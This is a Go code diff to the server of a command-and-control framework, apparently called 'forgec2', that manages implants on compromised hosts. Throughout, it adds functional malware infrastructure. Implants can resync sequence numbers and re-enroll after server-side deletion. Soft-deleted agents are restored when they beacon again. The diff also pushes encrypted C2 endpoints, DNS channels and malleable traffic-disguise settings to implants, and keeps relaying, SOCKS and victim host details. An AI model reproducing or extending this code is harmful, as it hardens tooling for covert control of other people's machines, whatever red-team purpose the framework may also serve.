@@ -34,13 +34,14 @@ import (
 // Local copies of protocol types (agent package is not importable as it is package main + build constrained)
 type beaconRequest struct {
 	UUID            string            `json:"uuid"`
+	Seq             uint64            `json:"seq,omitempty"` // frame sequence (mirrors the envelope)
 	ProtocolVersion uint              `json:"pv,omitempty"`
 	Info            map[string]string `json:"info,omitempty"`
 	Results         []taskResult      `json:"results,omitempty"`
 	AckTaskIDs      []uint            `json:"acks,omitempty"`
 	TaskCapacity    *int              `json:"task_capacity,omitempty"`
 	SocksData       []socksFrame      `json:"socks_data,omitempty"`
-	Relayed         []relayedData     `json:"relayed,omitempty"` // P2P: child results forwarded by parent
+	Relayed         []relayedData     `json:"relayed,omitempty"`        // P2P: child results forwarded by parent
 	RelayedFrames   []relayedFrame    `json:"relayed_frames,omitempty"` // P2P v2: opaque child envelopes
 
 	// ECDH + AES-256-GCM fields (forward-secret encryption)
@@ -107,14 +108,24 @@ type relayedTask struct {
 }
 
 type beaconResponse struct {
-	Tasks           []task        `json:"tasks"`
-	ProtocolVersion uint          `json:"pv,omitempty"`
-	Seq             uint64        `json:"seq,omitempty"`
-	RegOK           bool          `json:"reg_ok,omitempty"`
-	Rekey           bool          `json:"rekey,omitempty"`
-	SocksFrames   []socksFrame  `json:"socks_frames,omitempty"`
-	SocksFastMode bool          `json:"socks_fast,omitempty"`
-	Relayed       []relayedTask `json:"relayed,omitempty"` // P2P: tasks for children
+	Tasks           []task `json:"tasks"`
+	ProtocolVersion uint   `json:"pv,omitempty"`
+	Seq             uint64 `json:"seq,omitempty"`
+	RegOK           bool   `json:"reg_ok,omitempty"`
+	Rekey           bool   `json:"rekey,omitempty"`
+	// LastSeq is the server's current accepted sequence for this agent. On a
+	// successful beacon it lets the agent fast-forward if it ever drifted
+	// behind; in a replay-rejection it is returned (MAC-signed) so a desynced
+	// agent can resync instead of being permanently locked out.
+	LastSeq uint64 `json:"last_seq,omitempty"`
+	// Reregister is sent (with a valid response MAC) when the server received a
+	// valid handshake from a v3 agent whose implant row was deleted server-side.
+	// The handshake carries no identity key, so the agent must re-enroll with a
+	// fresh registration frame (it holds the identity key locally).
+	Reregister     bool           `json:"reregister,omitempty"`
+	SocksFrames    []socksFrame   `json:"socks_frames,omitempty"`
+	SocksFastMode  bool           `json:"socks_fast,omitempty"`
+	Relayed        []relayedTask  `json:"relayed,omitempty"`         // P2P: tasks for children
 	RelayedReplies []relayedReply `json:"relayed_replies,omitempty"` // P2P v2: opaque child response envelopes
 
 	// Fleet kill-switch broadcast: both fields are set only while the
@@ -129,6 +140,14 @@ type beaconResponse struct {
 	ECDHPub   string `json:"ecdh_pub,omitempty"` // base64-encoded server X25519 public key
 	CipherB64 string `json:"c,omitempty"`        // base64(nonce + AES-256-GCM ciphertext)
 	Mac       string `json:"mac,omitempty"`      // auth frame response MAC: HMAC(regKey, agentUUID||seq||server_pub)
+
+	// NetworkConfigOverWire delivers the agent's live network configuration at
+	// registration, encrypted under the per-implant registration secret
+	// (AES-256-GCM, key = HKDF(secret, "forgec2-network-config-v1")). The agent
+	// decrypts it and overrides its compile-time defaults, so the operator can
+	// rotate C2 endpoints / malleable profile without rebuilding the implant.
+	// Empty for v2 (master-key) implants, which carry their config embedded.
+	NetworkConfig string `json:"network_config,omitempty"`
 }
 
 // beaconEnvelope is the top-level transport envelope shared by HTTP, TCP and
@@ -138,11 +157,11 @@ type beaconEnvelope struct {
 	UUID        string `json:"uuid"`
 	Seq         uint64 `json:"seq,omitempty"`
 	Ts          int64  `json:"ts,omitempty"`
-	ECDHPub     string `json:"ecdh_pub,omitempty"` // base64 X25519 public key (handshake/registration)
-	CipherB64   string `json:"c,omitempty"`        // base64(nonce + AES-256-GCM ciphertext)
-	Mac         string `json:"mac,omitempty"`      // HMAC(regKey, uuid||ecdh_pub||ts) for handshake frames
-	IdentityPub string `json:"id_pub,omitempty"`   // registration: agent identity public key
-	RegHMAC     string `json:"reg_hmac,omitempty"` // registration: HMAC(regKey, uuid||id_pub||ts)
+	ECDHPub     string `json:"ecdh_pub,omitempty"`  // base64 X25519 public key (handshake/registration)
+	CipherB64   string `json:"c,omitempty"`         // base64(nonce + AES-256-GCM ciphertext)
+	Mac         string `json:"mac,omitempty"`       // HMAC(regKey, uuid||ecdh_pub||ts) for handshake frames
+	IdentityPub string `json:"id_pub,omitempty"`    // registration: agent identity public key
+	RegHMAC     string `json:"reg_hmac,omitempty"`  // registration: HMAC(regKey, uuid||id_pub||ts)
 	SecretID    string `json:"secret_id,omitempty"` // v3 registration: per-implant secret id ("" = legacy v2 master-key path)
 }
 
@@ -168,6 +187,12 @@ const maxSeqJump = 1000
 // jump exceeds the hard cap in acceptSeq. The lockout is in-memory and clears
 // on restart; the operator can also recover via the admin reset path.
 const seqLockoutDuration = 5 * time.Minute
+
+// regSecretOrphanTTL is how long an unbound v3 registration secret is retained
+// before the periodic sweep deletes it. A secret is created before the
+// toolchain runs, so a failed build leaves an unbound row; a successfully
+// deployed agent binds its secret on first check-in well within this window.
+const regSecretOrphanTTL = 7 * 24 * time.Hour
 
 // deriveRegKey returns the per-agent registration key. v3: when the implant
 // has a bound per-implant secret, that secret is used directly (the master key
@@ -210,23 +235,23 @@ func computeAuthMAC(regKey []byte, parts ...string) string {
 // bound into the frame MAC, a passive attacker cannot inflate seq; the hard
 // cap is defense-in-depth against a key-holding actor replay-flooding a
 // captured valid frame to burn the replay window.
-func (s *Server) acceptSeq(agentID string, seq uint64) (accepted bool, gap bool) {
+func (s *Server) acceptSeq(agentID string, seq uint64) (accepted bool) {
 	s.seqLockoutMu.Lock()
 	unlock, locked := s.seqLockout[agentID]
 	s.seqLockoutMu.Unlock()
 	if locked && time.Now().Before(unlock) {
-		return false, false
+		return false
 	}
 
 	var lastSeq uint64
 	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Pluck("last_seq", &lastSeq).Error; err != nil {
-		return false, false
+		return false
 	}
 	if seq <= lastSeq {
-		return false, false
+		return false
 	}
 	jump := seq - lastSeq
-	if jump > maxSeqJump*10 {
+	if jump > maxSeqJump {
 		// Cryptographically valid frame but an implausible jump. Do not
 		// advance the window and lock the agent out briefly so a flood cannot
 		// keep hammering the database or the handshake path.
@@ -237,15 +262,88 @@ func (s *Server) acceptSeq(agentID string, seq uint64) (accepted bool, gap bool)
 		s.seqLockout[agentID] = time.Now().Add(seqLockoutDuration)
 		s.seqLockoutMu.Unlock()
 		slog.Warn("Beacon seq jump exceeded hard cap, locking agent", "agent_id", agentID, "seq", seq, "last_seq", lastSeq)
-		return false, true
+		return false
 	}
 	res := s.db.Model(&db.Implant{}).
 		Where("id = ? AND last_seq = ?", agentID, lastSeq).
 		Update("last_seq", seq)
 	if res.Error != nil || res.RowsAffected != 1 {
-		return false, false
+		return false
 	}
-	return true, jump > maxSeqJump
+	return true
+}
+
+// startSeqLockoutCleanup periodically evicts expired seqLockout entries so the
+// map cannot grow without bound across many distinct agent IDs (a key-holding
+// actor could otherwise drive unbounded memory growth). Mirrors the
+// loginLockoutTracker cleanup pattern (S5).
+func (s *Server) startSeqLockoutCleanup(ctx context.Context) {
+	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				slog.Error("seqLockout cleanup recovered from panic", "err", r)
+			}
+		}()
+		ticker := time.NewTicker(10 * time.Minute)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			case <-ticker.C:
+				now := time.Now()
+				s.seqLockoutMu.Lock()
+				for id, unlock := range s.seqLockout {
+					if now.After(unlock) {
+						delete(s.seqLockout, id)
+					}
+				}
+				s.seqLockoutMu.Unlock()
+			}
+		}
+	}()
+}
+
+// currentLastSeq returns the implant's persisted last_seq (0 if unknown).
+func (s *Server) currentLastSeq(agentID string) uint64 {
+	var lastSeq uint64
+	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Pluck("last_seq", &lastSeq).Error; err != nil {
+		return 0
+	}
+	return lastSeq
+}
+
+// buildResyncResponse returns a MAC-signed plaintext envelope carrying the
+// server's current last_seq for an agent whose beacon was rejected as a replay
+// (its sequence fell behind the server's). The agent verifies the MAC (keyed
+// by its registration key) and fast-forwards its counter. Only emitted when a
+// real implant row exists, so an anonymous actor probing UUIDs learns nothing.
+func (s *Server) buildResyncResponse(agentID string, seq uint64) ([]byte, bool) {
+	// Require a real implant row: deriveRegKey falls back to a master-derived
+	// key for unknown UUIDs, so without this gate an anonymous actor could
+	// probe UUIDs and receive a MAC-signed resync (an existence oracle).
+	var imp db.Implant
+	if err := s.db.First(&imp, "id = ?", agentID).Error; err != nil {
+		return nil, false
+	}
+	lastSeq := s.currentLastSeq(agentID)
+	regKey := s.deriveRegKey(agentID)
+	if regKey == nil {
+		return nil, false
+	}
+	serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
+	resp := beaconResponse{
+		ProtocolVersion: protocol.CurrentProtocolVersion,
+		Seq:             seq,
+		LastSeq:         lastSeq,
+		ECDHPub:         serverPub,
+		Mac:             computeAuthMAC(regKey, agentID, strconv.FormatUint(seq, 10), serverPub),
+	}
+	respBytes, ok := marshalJSONSafe(resp)
+	if !ok {
+		return nil, false
+	}
+	return respBytes, true
 }
 
 // decodeBeaconEnvelope parses and authenticates a v2 transport envelope.
@@ -304,13 +402,10 @@ func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req 
 		// authentication. Advancing it earlier let any anonymous actor who
 		// knows a UUID burn the window with garbage frames and permanently
 		// lock out the real agent.
-		accepted, gap := s.acceptSeq(envelope.UUID, envelope.Seq)
+		accepted := s.acceptSeq(envelope.UUID, envelope.Seq)
 		if !accepted {
 			slog.Warn("Beacon rejected: replay or out-of-order seq", "agent_id", envelope.UUID, "seq", envelope.Seq)
 			return beaconEnvelope{}, beaconRequest{}, frameRejected
-		}
-		if gap {
-			slog.Warn("Beacon: large seq jump", "agent_id", envelope.UUID, "seq", envelope.Seq)
 		}
 
 		s.configMu.RLock()
@@ -328,6 +423,7 @@ func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req 
 			return beaconEnvelope{}, beaconRequest{}, frameRejected
 		}
 		req.UUID = envelope.UUID
+		req.Seq = envelope.Seq
 		s.sessionManager.IncrementMessageCount(envelope.UUID)
 		return envelope, req, frameEncrypted
 	}
@@ -352,8 +448,17 @@ func (s *Server) decodeBeaconEnvelope(raw []byte) (envelope beaconEnvelope, req 
 // first contact is a v2 registration frame (register frames carry no host info,
 // so the normal processAgentRegistration path is not available).
 func (s *Server) ensureBeaconImplantRow(agentID string) {
-	var count int64
-	if err := s.db.Model(&db.Implant{}).Where("id = ?", agentID).Count(&count).Error; err != nil || count > 0 {
+	var existing db.Implant
+	res := s.db.Unscoped().Where("id = ?", agentID).First(&existing)
+	if res.Error == nil {
+		// Row exists (possibly soft-deleted): restore the tombstone if needed so
+		// the subsequent registration update can bind to it.
+		if existing.DeletedAt.Valid {
+			s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", agentID).Update("deleted_at", nil)
+		}
+		return
+	}
+	if res.Error != gorm.ErrRecordNotFound {
 		return
 	}
 	row := db.Implant{ID: agentID, LastSeen: time.Now(), Status: "online"}
@@ -367,22 +472,25 @@ func (s *Server) ensureBeaconImplantRow(agentID string) {
 // authenticated with the per-agent registration key. Returns the JSON response
 // envelope and ok=false on any authentication/state failure.
 func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]byte, bool) {
-	regKey := s.deriveRegKey(env.UUID)
-	if kind == frameRegister && env.SecretID != "" {
-		// v3: the implant carries only its own per-implant secret id, so the
-		// registration key must come from the secret store, not the master key.
-		if key := s.regSecretByID(env.SecretID); key != nil {
-			regKey = key
-		} else {
-			slog.Warn("Beacon registration rejected: unknown secret_id", "agent_id", env.UUID)
-			return nil, false
-		}
+	// Enforce the v3 per-implant secret (deprecate the legacy v2 master-key
+	// path). v3 implants carry a per-implant secret id (SecretID) and MUST be
+	// authenticated against the secret store, not the fleet master key. This
+	// applies to BOTH registration and handshake frames: a v3 agent that has
+	// already registered locally still presents its SecretID on every
+	// handshake, so a server-side row deletion (the per-implant secret outlives
+	// the row) can be recovered without re-enrollment. Implants that present no
+	// SecretID (the old master-key derivation path) are rejected outright.
+	if env.SecretID == "" {
+		slog.Warn("Beacon rejected: v2 master-key path deprecated; implant must carry a per-implant secret id", "agent_id", env.UUID, "kind", kind)
+		return nil, false
 	}
-	if regKey == nil {
-		slog.Warn("Beacon rejected: no master beacon key configured", "agent_id", env.UUID)
+	regKey, ok := s.regSecretForAuth(env.SecretID, env.UUID)
+	if !ok {
+		slog.Warn("Beacon auth rejected: unknown or misbound secret_id", "agent_id", env.UUID, "kind", kind)
 		return nil, false
 	}
 
+	// Authenticate the frame MAC against the resolved key.
 	if kind == frameRegister {
 		expected := crypto.ComputeRegHMAC(regKey, env.UUID, env.IdentityPub, env.Ts, env.Seq)
 		got, err := base64.StdEncoding.DecodeString(env.RegHMAC)
@@ -394,37 +502,6 @@ func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]b
 		if err != nil || len(pub) != 32 {
 			slog.Warn("Beacon registration rejected: invalid identity key", "agent_id", env.UUID)
 			return nil, false
-		}
-		// Only create the implant row once the frame is authenticated; an
-		// unauthenticated UUID must never be able to write rows to the DB.
-		s.ensureBeaconImplantRow(env.UUID)
-		updates := map[string]interface{}{
-			"identity_pub": env.IdentityPub,
-			"registered":   true,
-			"last_seq":     env.Seq,
-		}
-		if env.SecretID != "" {
-			updates["secret_id"] = env.SecretID
-		}
-		// Bind identity: only the first registration (registered=false) wins.
-		res := s.db.Model(&db.Implant{}).
-			Where("id = ? AND registered = ? AND last_seq < ?", env.UUID, false, env.Seq).
-			Updates(updates)
-		if res.Error != nil || res.RowsAffected != 1 {
-			slog.Warn("Beacon registration rejected: already registered or replay", "agent_id", env.UUID)
-			return nil, false
-		}
-		s.bindRegSecret(env.SecretID, env.UUID)
-		if s.sessionManager != nil {
-			if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
-				slog.Warn("Beacon registration: session establish failed", "agent_id", env.UUID, "err", err)
-				return nil, false
-			}
-		}
-		if env.SecretID != "" {
-			slog.Info("Beacon registered (v3 per-implant secret)", "agent_id", env.UUID)
-		} else {
-			slog.Info("Beacon registered (v2 master key)", "agent_id", env.UUID)
 		}
 	} else { // frameHandshake
 		// The handshake must bind the presented ecdh_pub, timestamp AND the
@@ -443,13 +520,80 @@ func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]b
 			slog.Warn("Beacon handshake rejected: bad mac", "agent_id", env.UUID)
 			return nil, false
 		}
-		accepted, gap := s.acceptSeq(env.UUID, env.Seq)
-		if !accepted {
-			slog.Warn("Beacon handshake rejected: replay", "agent_id", env.UUID, "seq", env.Seq)
+	}
+
+	// Make sure an implant row exists. ensureBeaconImplantRow restores a
+	// soft-deleted row (preserving its secret_id/registered state) and creates
+	// a fresh unregistered row when the row is hard-deleted — both let a v3
+	// agent recover via the handshake below.
+	s.ensureBeaconImplantRow(env.UUID)
+	var imp db.Implant
+	s.db.First(&imp, "id = ?", env.UUID)
+
+	// A normal handshake from an already-registered agent leaves the row as-is;
+	// first registration (or a v3 recovery where the row is gone/unregistered)
+	// (re)binds the identity and re-registers.
+	needRegister := kind == frameRegister || !imp.Registered
+
+	if needRegister && kind == frameHandshake {
+		// v3 recovery path: the handshake MAC proves the per-implant secret, but
+		// a handshake frame carries no identity key, so the server cannot bind
+		// the identity. Signal the agent to re-enroll with a fresh registration
+		// frame (it holds the identity key locally). The response is still MAC'd
+		// so the agent trusts it.
+		serverPub := base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
+		resp := beaconResponse{
+			ProtocolVersion: protocol.CurrentProtocolVersion,
+			Seq:             env.Seq,
+			Reregister:      true,
+			ECDHPub:         serverPub,
+			Mac:             computeAuthMAC(regKey, env.UUID, strconv.FormatUint(env.Seq, 10), serverPub),
+		}
+		// Honor a fleet kill-switch even on the re-register handshake.
+		s.enforceKillSwitch(imp, &resp)
+		respBytes, ok := marshalJSONSafe(resp)
+		if !ok {
 			return nil, false
 		}
-		if gap {
-			slog.Warn("Beacon handshake: large seq jump", "agent_id", env.UUID, "seq", env.Seq)
+		return respBytes, true
+	}
+
+	if needRegister {
+		pub, err := base64.StdEncoding.DecodeString(env.IdentityPub)
+		if err != nil || len(pub) != 32 {
+			slog.Warn("Beacon registration rejected: invalid identity key", "agent_id", env.UUID)
+			return nil, false
+		}
+		// Only write the row once the frame is authenticated; an unauthenticated
+		// UUID must never be able to write rows to the DB.
+		updates := map[string]interface{}{
+			"identity_pub": env.IdentityPub,
+			"registered":   true,
+			"last_seq":     env.Seq,
+			"secret_id":    env.SecretID,
+		}
+		// Bind identity: only the first registration (registered=false) wins for
+		// a given (uuid, seq) — a replayed or concurrent register is rejected.
+		res := s.db.Model(&db.Implant{}).
+			Where("id = ? AND registered = ? AND last_seq < ?", env.UUID, false, env.Seq).
+			Updates(updates)
+		if res.Error != nil || res.RowsAffected != 1 {
+			slog.Warn("Beacon registration rejected: already registered or replay", "agent_id", env.UUID)
+			return nil, false
+		}
+		s.bindRegSecret(env.SecretID, env.UUID)
+		if s.sessionManager != nil {
+			if err := s.sessionManager.EstablishSession(env.UUID, pub); err != nil {
+				slog.Warn("Beacon registration: session establish failed", "agent_id", env.UUID, "err", err)
+				return nil, false
+			}
+		}
+		slog.Info("Beacon registered (v3 per-implant secret)", "agent_id", env.UUID, "recovery", kind != frameRegister)
+	} else { // frameHandshake for an already-registered agent
+		accepted := s.acceptSeq(env.UUID, env.Seq)
+		if !accepted {
+			slog.Warn("Beacon handshake rejected: replay or missing row", "agent_id", env.UUID, "seq", env.Seq)
+			return nil, false
 		}
 		pub, err := base64.StdEncoding.DecodeString(env.ECDHPub)
 		if err != nil || len(pub) != 32 {
@@ -470,15 +614,62 @@ func (s *Server) processAuthFrame(env beaconEnvelope, kind beaconFrameKind) ([]b
 	resp := beaconResponse{
 		ProtocolVersion: protocol.CurrentProtocolVersion,
 		Seq:             env.Seq,
-		RegOK:           kind == frameRegister,
+		RegOK:           needRegister,
 		ECDHPub:         serverPub,
 		Mac:             computeAuthMAC(regKey, env.UUID, strconv.FormatUint(env.Seq, 10), serverPub),
 	}
+	// Deliver the live network config (encrypted under the per-implant secret)
+	// on registration so the implant can override its compile-time defaults.
+	if nc, err := s.buildNetworkConfig(imp, regKey); err == nil {
+		resp.NetworkConfig = nc
+	}
+	// Honor a fleet kill-switch on registration/handshake responses too, so a
+	// newly-checking-in or recovering agent still obeys a self-destruct order.
+	s.enforceKillSwitch(imp, &resp)
 	respBytes, ok := marshalJSONSafe(resp)
 	if !ok {
 		return nil, false
 	}
 	return respBytes, true
+}
+
+// buildNetworkConfig assembles the agent's operational network configuration
+// from the bound listener, the server-wide malleable profile, and the
+// server-tracked per-agent sleep values, then encrypts it under the per-implant
+// registration secret (AES-256-GCM, key = HKDF(secret, network-config info)).
+// v2 (master-key) implants never reach here with a usable secret and get "".
+func (s *Server) buildNetworkConfig(imp db.Implant, regKey []byte) (string, error) {
+	if len(regKey) != 32 {
+		return "", fmt.Errorf("invalid reg key")
+	}
+	nc := &protocol.NetworkConfig{}
+	if imp.ListenerID != 0 {
+		if rl, err := s.resolveListener(imp.ListenerID); err == nil {
+			nc.C2URL = rl.C2URL
+			nc.Protocol = rl.Protocol
+			nc.BeaconTransport = rl.BeaconTransport
+			nc.DNSDomain = rl.DNSDomain
+			nc.DNSServer = rl.DNSServer
+		}
+	}
+	if s != nil {
+		s.configMu.RLock()
+		nc.MalleablePrepend = s.cfg.Malleable.Prepend
+		nc.MalleableAppend = s.cfg.Malleable.Append
+		nc.RequestPrepend = s.cfg.Malleable.RequestPrepend
+		nc.RequestAppend = s.cfg.Malleable.RequestAppend
+		nc.RequestHeaders = s.cfg.Malleable.RequestHeaders
+		s.configMu.RUnlock()
+	}
+	// Only override sleep values when the server holds authoritative ones
+	// (otherwise leave 0 so the agent keeps its compile-time interval/jitter).
+	if imp.CurrentInterval > 0 {
+		nc.Interval = imp.CurrentInterval
+	}
+	if imp.CurrentJitter > 0 {
+		nc.Jitter = imp.CurrentJitter
+	}
+	return protocol.EncryptNetworkConfig(regKey, nc)
 }
 
 // buildBeaconResponse wraps a processed beacon response in the transport
@@ -541,8 +732,23 @@ func (s *Server) handleBeacon(c *gin.Context) {
 		return
 	}
 
+	// Strip request-side malleable wrapping the agent applied to the OUTGOING
+	// beacon body before decoding the envelope.
+	raw = s.stripMalleableRequest(raw)
+
 	env, req, kind := s.decodeBeaconEnvelope(raw)
 	if kind == frameRejected {
+		// A replay-rejected encrypted frame means the agent's sequence fell
+		// behind the server's. Reply with a MAC-signed resync carrying the
+		// server's current last_seq so the agent can fast-forward instead of
+		// being permanently locked out. Only attempted for genuine encrypted
+		// frames from a known agent (no row => buildResyncResponse returns false).
+		if env.CipherB64 != "" && isValidAgentID(env.UUID) {
+			if body, ok := s.buildResyncResponse(env.UUID, env.Seq); ok {
+				c.Data(http.StatusOK, "application/json", body)
+				return
+			}
+		}
 		respondError(c, http.StatusBadRequest, "invalid beacon payload")
 		return
 	}
@@ -679,8 +885,22 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 	}
 
 	var agent db.Implant
-	result := s.db.Where("id = ?", req.UUID).First(&agent)
+	// Unscoped so a previously soft-deleted agent is still found; otherwise a
+	// returning agent would be treated as new and hit a primary-key conflict on
+	// Create, permanently locking it out of re-registration.
+	result := s.db.Unscoped().Where("id = ?", req.UUID).First(&agent)
 	isNewAgent := result.Error == gorm.ErrRecordNotFound
+
+	if !isNewAgent && agent.DeletedAt.Valid {
+		// Agent was removed from the UI but is beaconing again: restore the
+		// tombstone (un-delete) rather than leaving a row that blocks re-registration.
+		if uerr := s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", agent.ID).Update("deleted_at", nil).Error; uerr != nil {
+			slog.Error("Failed to restore soft-deleted agent", "agent_id", agent.ID, "error", uerr)
+		} else {
+			agent.DeletedAt = gorm.DeletedAt{}
+			slog.Info("Restored soft-deleted agent on re-beacon", "agent_id", agent.ID)
+		}
+	}
 
 	if isNewAgent {
 		hostname, username, ip := decodeBeaconIdentity(req.Info)
@@ -731,7 +951,7 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			// Create won the primary-key race. Re-read the now-existing row and
 			// continue as an update path instead of dropping this beacon.
 			slog.Debug("Agent create raced, re-reading existing row", "agent_id", agent.ID, "error", err)
-			if rerr := s.db.Where("id = ?", req.UUID).First(&agent).Error; rerr != nil {
+			if rerr := s.db.Unscoped().Where("id = ?", req.UUID).First(&agent).Error; rerr != nil {
 				slog.Error("Failed to create agent", "agent_id", agent.ID, "error", err)
 				return db.Implant{}, false
 			}
@@ -816,6 +1036,26 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 				updates["active_window"] = v
 			}
 		}
+		// Re-assert stable identity attributes reported by the agent. They are
+		// set at registration, but a stageless build, a clone, or a partial
+		// first beacon can leave them empty forever if we never refresh them.
+		// Refresh whenever a non-empty value arrives; never overwrite a populated
+		// value with an empty one.
+		if v := req.Info["hostname"]; v != "" {
+			updates["hostname"] = v
+		}
+		if v := req.Info["username"]; v != "" {
+			updates["username"] = v
+		}
+		if v := req.Info["os"]; v != "" {
+			updates["os"] = v
+		}
+		if v := req.Info["arch"]; v != "" {
+			updates["arch"] = v
+		}
+		if v := req.Info["ip"]; v != "" && v != agent.IP {
+			updates["ip"] = v
+		}
 		if lid := req.Info["listener_id"]; lid != "" {
 			if id, err := strconv.ParseUint(lid, 10, 32); err == nil && agent.ListenerID == 0 {
 				updates["listener_id"] = uint(id)
@@ -840,9 +1080,11 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			updates["protocol_version"] = req.ProtocolVersion
 		}
 
-		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon
+		// Atomic update: only update if last_seen hasn't been changed by a concurrent beacon.
+		// Unscoped so the update still applies if the row was just restored from a
+		// soft-delete tombstone (deleted_at not yet cleared in this transaction's view).
 		updateErr := s.db.Transaction(func(tx *gorm.DB) error {
-			txResult := tx.Model(&db.Implant{}).Where("id = ? AND last_seen <= ?", agent.ID, agent.LastSeen).Updates(updates)
+			txResult := tx.Unscoped().Model(&db.Implant{}).Where("id = ? AND last_seen <= ?", agent.ID, agent.LastSeen).Updates(updates)
 			if txResult.Error != nil {
 				return txResult.Error
 			}
@@ -1060,10 +1302,15 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 
 		// Result size cap is enforced before parsing (see above); screenshots
 		// are exempt from the cap.
+		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
+		// `task` stays plaintext for the WebSocket broadcast and task callback
+		// below, while only the persisted ciphertext differs.
+		dbTask := *task
+		dbTask.EncryptTaskFields()
 		if err := s.db.Model(task).Updates(map[string]interface{}{
 			"status":      task.Status,
-			"result":      task.Result,
-			"error":       task.Error,
+			"result":      dbTask.Result,
+			"error":       dbTask.Error,
 			"progress":    task.Progress,
 			"total_bytes": task.TotalBytes,
 			"transferred": task.Transferred,
@@ -1412,12 +1659,14 @@ func (s *Server) processRelayedEnvelopes(frames []relayedFrame, parentUUID, publ
 // different parent is rejected (protects against relay hijacking).
 func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 	var agent db.Implant
-	err := s.db.Where("id = ?", childID).First(&agent).Error
+	// Unscoped so a soft-deleted child row is still found and restored rather
+	// than causing a primary-key conflict on Create.
+	err := s.db.Unscoped().Where("id = ?", childID).First(&agent).Error
 	if err == gorm.ErrRecordNotFound {
 		row := db.Implant{ID: childID, ParentID: parentUUID, LastSeen: time.Now(), Status: "online"}
 		if cerr := s.db.Create(&row).Error; cerr != nil {
 			// Concurrent create raced: re-check the winner's parent binding.
-			if rerr := s.db.Where("id = ?", childID).First(&agent).Error; rerr != nil {
+			if rerr := s.db.Unscoped().Where("id = ?", childID).First(&agent).Error; rerr != nil {
 				slog.Debug("bindRelayChildToParent create raced", "child", childID, "error", cerr)
 				return false
 			}
@@ -1425,7 +1674,7 @@ func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 				return false
 			}
 			if agent.ParentID == "" {
-				s.db.Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID)
+				s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID)
 			}
 			return true
 		}
@@ -1435,8 +1684,11 @@ func (s *Server) bindRelayChildToParent(childID, parentUUID string) bool {
 		slog.Error("Failed to check relay child link", "child", childID, "error", err)
 		return false
 	}
+	if agent.DeletedAt.Valid {
+		s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("deleted_at", nil)
+	}
 	if agent.ParentID == "" {
-		return s.db.Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID).Error == nil
+		return s.db.Unscoped().Model(&db.Implant{}).Where("id = ?", childID).Update("parent_id", parentUUID).Error == nil
 	}
 	return agent.ParentID == parentUUID
 }
@@ -1743,6 +1995,10 @@ func (s *Server) enforceKillSwitch(agent db.Implant, resp *beaconResponse) {
 func beaconFingerprint(req beaconRequest) string {
 	h := fnv.New64a()
 	h.Write([]byte(req.UUID))
+	// Include the frame sequence so a legitimate retransmission with a NEW seq
+	// but identical payload is not mistaken for a duplicate and silently
+	// dropped (which would lose its tasks when a response was dropped).
+	h.Write([]byte(strconv.FormatUint(req.Seq, 10)))
 	for _, r := range req.Results {
 		h.Write([]byte(r.Type))
 		h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
@@ -1894,6 +2150,7 @@ func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconRespons
 		Relayed:         s.fetchRelayedChildTasks(req.UUID),
 		RelayedReplies:  relayedReplies,
 		ProtocolVersion: protocol.CurrentProtocolVersion,
+		LastSeq:         s.currentLastSeq(req.UUID),
 	}
 
 	s.enforceKillDate(agent, &resp, now)
@@ -1954,110 +2211,6 @@ func (s *Server) handleServeScreenshot(c *gin.Context) {
 	}
 
 	serveFileSafe(c, requested, screenshotRoot, "")
-}
-
-// saveFileChunk handles writing a base64-encoded file chunk to disk for both
-// upload and download task types. Returns true if the caller should continue
-// to the next result (i.e. skip normal task-result processing).
-func saveFileChunk(s *Server, uuid string, task *db.Task, r taskResult, logPrefix string, resultPrefix string) bool {
-	uploadBase := safeJoin(filepath.Join(s.cfg.Server.DataDir, "uploads"), uuid)
-	if uploadBase == "" {
-		slog.Error("Invalid agent ID for upload path", "agent_id", uuid)
-		task.Result = "ERROR: invalid agent id"
-		if err := s.db.Save(task).Error; err != nil {
-			slog.Error("Failed to save invalid agent id error", "task_id", task.ID, "error", err)
-		}
-		return true
-	}
-	if err := os.MkdirAll(uploadBase, 0700); err != nil {
-		slog.Error("Failed to create uploads dir", "agent_id", uuid, "error", err)
-	}
-	filename := r.Filename
-	if filename == "" {
-		filename = fmt.Sprintf("file_%d", task.ID)
-	}
-	filePath := safeJoin(uploadBase, filename)
-	if filePath == "" {
-		task.Result = "ERROR: invalid filename (path traversal blocked)"
-		if err := s.db.Save(task).Error; err != nil {
-			slog.Error("Failed to save file path traversal error", "task_id", task.ID, "error", err)
-		}
-		return true
-	}
-	decoded, err := base64.StdEncoding.DecodeString(r.Output)
-	if err != nil {
-		task.Result = fmt.Sprintf("ERROR: base64 decode failed: %v", err)
-		if len(task.Result) > MaxResultSize {
-			task.Result = truncateString(task.Result, MaxResultSize)
-		}
-		if saveErr := s.db.Save(task).Error; saveErr != nil {
-			slog.Error("Failed to save decode error", "task_id", task.ID, "error", saveErr)
-		}
-		return true
-	}
